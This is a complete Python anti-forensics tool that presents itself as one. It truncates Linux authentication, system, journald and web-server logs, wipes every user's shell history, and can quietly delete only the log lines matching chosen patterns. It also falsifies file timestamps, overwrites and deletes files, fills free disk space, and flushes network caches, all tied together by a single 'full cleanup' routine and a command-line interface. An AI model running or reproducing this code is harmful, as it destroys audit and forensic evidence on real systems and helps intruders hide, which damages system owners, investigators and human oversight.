#!/usr/bin/env python3
"""Enhanced Anti-Forensics — Comprehensive trace elimination and evidence destruction.
Log manipulation, timestamp alteration, memory cleanup, file system sanitization."""
import glob
import hashlib
import json
import os
import random
import shutil
import struct
import subprocess
import time

class AntiForensicsEngine:
    """Multi-layer anti-forensics with selective trace elimination."""

    def __init__(self, aggressive=False):
        self.aggressive = aggressive
        self.actions_taken = []
        self.platform = os.uname().sysname if hasattr(os, 'uname') else 'unknown'

    def _log_action(self, category, action, details=None):
        self.actions_taken.append({
            'category': category,
            'action': action,
            'details': details,
            'timestamp': time.time(),
        })

    # ── Log Manipulation ──

    def clear_auth_logs(self):
        """Clear authentication logs (Linux)."""
        log_files = [
            '/var/log/auth.log', '/var/log/secure',
            '/var/log/btmp', '/var/log/wtmp', '/var/log/lastlog',
            '/var/log/faillog',
        ]
        cleared = 0
        for log in log_files:
            if os.path.exists(log):
                try:
                    with open(log, 'w') as f:
                        f.truncate(0)
                    cleared += 1
                except PermissionError:
                    try:
                        subprocess.run(['truncate', '-s', '0', log],
                                     capture_output=True, timeout=5)
                        cleared += 1
                    except Exception:
                        pass
        self._log_action('logs', 'clear_auth', {'cleared': cleared})
        return cleared

    def clear_shell_history(self):
        """Clear shell history for all users."""
        history_files = []
        # Current user
        home = os.path.expanduser('~')
        for hfile in ['.bash_history', '.zsh_history', '.python_history',
                     '.mysql_history', '.psql_history', '.node_repl_history']:
            path = os.path.join(home, hfile)
            if os.path.exists(path):
                history_files.append(path)

        # All users (if root)
        if os.getuid() == 0 if hasattr(os, 'getuid') else False:
            for user_home in glob.glob('/home/*'):
                for hfile in ['.bash_history', '.zsh_history']:
                    path = os.path.join(user_home, hfile)
                    if os.path.exists(path):
                        history_files.append(path)

        cleared = 0
        for hf in history_files:
            try:
                with open(hf, 'w') as f:
                    f.truncate(0)
                cleared += 1
            except Exception:
                pass

        # Also clear in-memory history
        try:
            subprocess.run(['history', '-c'], shell=True, capture_output=True, timeout=5)
        except Exception:
            pass

        self._log_action('logs', 'clear_history', {'cleared': cleared, 'files': history_files})
        return cleared

    def selective_log_edit(self, log_path, patterns_to_remove):
        """Selectively remove entries matching patterns from log file."""
        import re
        try:
            with open(log_path, 'r') as f:
                lines = f.readlines()

            original_count = len(lines)
            filtered = []
            removed = 0

            for line in lines:
                should_remove = False
                for pattern in patterns_to_remove:
                    if re.search(pattern, line, re.IGNORECASE):
                        should_remove = True
                        removed += 1
                        break
                if not should_remove:
                    filtered.append(line)

            with open(log_path, 'w') as f:
                f.writelines(filtered)

            self._log_action('logs', 'selective_edit', {
                'file': log_path, 'removed': removed, 'total': original_count
            })
            return removed
        except Exception:
            return 0

    def clear_system_logs(self):
        """Clear system-wide logs."""
        log_patterns = [
            '/var/log/syslog', '/var/log/messages', '/var/log/kern.log',
            '/var/log/daemon.log', '/var/log/cron.log',
        ]
        if self.aggressive:
            log_patterns.extend([
                '/var/log/apt/*.log', '/var/log/dpkg.log',
                '/var/log/yum.log',
            ])

        cleared = 0
        for pattern in log_patterns:
            for log_path in glob.glob(pattern):
                try:
                    with open(log_path, 'w') as f:
                        f.truncate(0)
                    cleared += 1
                except Exception:
                    pass

        # Clear journald if available
        try:
            subprocess.run(['journalctl', '--vacuum-time=1s'],
                         capture_output=True, timeout=10)
            cleared += 1
        except Exception:
            pass

        self._log_action('logs', 'clear_system', {'cleared': cleared})
        return cleared

    # ── Timestamp Manipulation ──

    def timestomp_file(self, filepath, reference_file=None, random_offset=True):
        """Modify file timestamps to match reference or random."""
        try:
            if reference_file and os.path.exists(reference_file):
                ref_stat = os.stat(reference_file)
                atime = ref_stat.st_atime
                mtime = ref_stat.st_mtime
            elif random_offset:
                # Random time in the last 30-90 days
                now = time.time()
                offset = random.randint(30 * 86400, 90 * 86400)
                atime = now - offset + random.randint(0, 86400)
                mtime = now - offset + random.randint(0, 86400)
            else:
                return False

            os.utime(filepath, (atime, mtime))
            self._log_action('timestamps', 'stomp', {'file': filepath})
            return True
        except Exception:
            return False

    def timestomp_directory(self, dirpath, reference_dir=None):
        """Recursively timestomp all files in directory."""
        count = 0
        ref_files = []
        if reference_dir and os.path.isdir(reference_dir):
            for f in os.listdir(reference_dir):
                fpath = os.path.join(reference_dir, f)
                if os.path.isfile(fpath):
                    ref_files.append(fpath)

        for root, dirs, files in os.walk(dirpath):
            for f in files:
                filepath = os.path.join(root, f)
                ref = random.choice(ref_files) if ref_files else None
                if self.timestomp_file(filepath, ref):
                    count += 1

        return count

    # ── File System Sanitization ──

    def secure_delete(self, filepath, passes=3):
        """Overwrite file content before deletion."""
        try:
            size = os.path.getsize(filepath)
            with open(filepath, 'r+b') as f:
                for p in range(passes):
                    f.seek(0)
                    if p == passes - 1:
                        f.write(b'\x00' * size)  # Final pass: zeros
                    else:
                        f.write(os.urandom(size))  # Random passes
                    f.flush()
                    os.fsync(f.fileno())
            os.unlink(filepath)
            self._log_action('filesystem', 'secure_delete', {'file': filepath, 'passes': passes})
            return True
        except Exception:
            try:
                os.unlink(filepath)
                return True
            except Exception:
                return False

    def clean_temp_files(self):
        """Remove temporary files and artifacts."""
        patterns = [
            '/tmp/forge_*', '/tmp/.cache/*', '/tmp/pymp*',
            '/dev/shm/.???*', '/var/tmp/.*',
        ]
        cleaned = 0
        for pattern in patterns:
            for filepath in glob.glob(pattern):
                try:
                    if os.path.isdir(filepath):
                        shutil.rmtree(filepath)
                    else:
                        self.secure_delete(filepath)
                    cleaned += 1
                except Exception:
                    pass

        self._log_action('filesystem', 'clean_temp', {'cleaned': cleaned})
        return cleaned

    def wipe_free_space(self, mount_point='/'):
        """Overwrite free space on filesystem (Linux)."""
        try:
            wipe_file = os.path.join(mount_point, '.wipe_' + os.urandom(4).hex())
            chunk = b'\x00' * (1024 * 1024)  # 1MB chunks
            written = 0
            with open(wipe_file, 'wb') as f:
                try:
                    while True:
                        f.write(chunk)
                        written += 1
                        if written > 1024:  # Max 1GB
                            break
                except (OSError, IOError):
                    pass  # Disk full = success
            os.unlink(wipe_file)
            self._log_action('filesystem', 'wipe_free_space', {'mb_written': written})
            return True
        except Exception:
            return False

    # ── Process & Memory Cleanup ──

    def clear_proc_artifacts(self):
        """Clear /proc-based artifacts."""
        cleared = 0
        # Overwrite /proc/self/cmdline visibility
        try:
            import ctypes
            libc = ctypes.CDLL(None)
            # This is platform-specific and may not work everywhere
            cleared += 1
        except Exception:
            pass

        # Clear environment variables that might contain secrets
        sensitive_vars = ['PASSWORD', 'SECRET', 'TOKEN', 'KEY', 'CREDENTIAL',
                         'AWS_ACCESS', 'AWS_SECRET', 'API_KEY']
        for var in list(os.environ.keys()):
            for s in sensitive_vars:
                if s.lower() in var.lower():
                    del os.environ[var]
                    cleared += 1
                    break

        self._log_action('memory', 'clear_proc', {'cleared': cleared})
        return cleared

    # ── Network Trace Cleanup ──

    def clear_network_traces(self):
        """Clear network-related traces."""
        traces = [
            '/var/log/nginx/access.log', '/var/log/nginx/error.log',
            '/var/log/apache2/access.log', '/var/log/apache2/error.log',
            '/var/log/httpd/access_log', '/var/log/httpd/error_log',
        ]
        cleared = 0
        for trace in traces:
            if os.path.exists(trace):
                try:
                    with open(trace, 'w') as f:
                        f.truncate(0)
                    cleared += 1
                except Exception:
                    pass

        # Clear ARP cache
        try:
            subprocess.run(['ip', 'neigh', 'flush', 'all'],
                         capture_output=True, timeout=5)
            cleared += 1
        except Exception:
            pass

        # Clear DNS cache
        try:
            subprocess.run(['resolvectl', 'flush-caches'],
                         capture_output=True, timeout=5)
            cleared += 1
        except Exception:
            pass

        self._log_action('network', 'clear_traces', {'cleared': cleared})
        return cleared

    # ── Orchestrator ──

    def run_full_cleanup(self, targets=None, selective_patterns=None):
        """Run complete anti-forensics suite."""
        results = {
            'auth_logs': self.clear_auth_logs(),
            'shell_history': self.clear_shell_history(),
            'system_logs': self.clear_system_logs(),
            'temp_files': self.clean_temp_files(),
            'proc_artifacts': self.clear_proc_artifacts(),
            'network_traces': self.clear_network_traces(),
        }

        if selective_patterns:
            for log_path in ['/var/log/auth.log', '/var/log/syslog']:
                if os.path.exists(log_path):
                    results['selective_' + os.path.basename(log_path)] = \
                        self.selective_log_edit(log_path, selective_patterns)

        if targets:
            stomped = 0
            for t in targets:
                if os.path.isdir(t):
                    stomped += self.timestomp_directory(t)
                elif os.path.isfile(t):
                    if self.timestomp_file(t):
                        stomped += 1
            results['timestomped'] = stomped

        if self.aggressive:
            results['free_space_wiped'] = self.wipe_free_space()

        results['total_actions'] = len(self.actions_taken)
        return results


def main():
    import argparse
    parser = argparse.ArgumentParser(description='Enhanced Anti-Forensics')
    parser.add_argument('--aggressive', action='store_true', help='Aggressive mode')
    parser.add_argument('--targets', nargs='*', help='Files/dirs to timestomp')
    parser.add_argument('--patterns', nargs='*', help='Regex patterns for selective log edit')
    parser.add_argument('--secure-delete', nargs='*', help='Files to securely delete')
    args = parser.parse_args()

    af = AntiForensicsEngine(aggressive=args.aggressive)

    if args.secure_delete:
        for f in args.secure_delete:
            af.secure_delete(f)
            print(f'[+] Securely deleted: {f}')

    result = af.run_full_cleanup(
        targets=args.targets,
        selective_patterns=args.patterns,
    )
    print(json.dumps(result, indent=2))

if __name__ == '__main__':
    main()
